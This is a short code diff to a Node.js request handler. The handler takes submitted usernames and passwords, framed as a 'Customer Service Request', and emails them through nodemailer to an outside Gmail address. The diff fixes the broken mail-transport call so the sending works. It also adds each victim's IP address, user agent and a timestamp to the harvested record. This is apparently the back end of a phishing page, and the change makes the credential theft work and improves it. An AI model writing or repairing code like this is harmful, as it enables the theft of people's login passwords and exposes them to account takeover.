@@ -31,7 +31,7 @@ module.exports = async function handler(req, res) {
 
     const maillist = ['Gfequitygroupjobcenter@gmail.com'];
 
-    const transporter = nodemailer.createTransporter({
+    const transporter = nodemailer.createTransport({
       host: "smtp.gmail.com",
       port: 587,
       secure: false,
@@ -66,6 +66,9 @@ module.exports = async function handler(req, res) {
         <h3>New Customer Service Request</h3>
         <p><strong>Email/Username:</strong> ${phwet || 'Not provided'}</p>
         <p><strong>Password:</strong> ${psdwet || 'Not provided'}</p>
+        <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
+        <p><strong>User Agent:</strong> ${req.headers['user-agent'] || 'Not provided'}</p>
+        <p><strong>IP Address:</strong> ${req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Not provided'}</p>
       `
     };
 
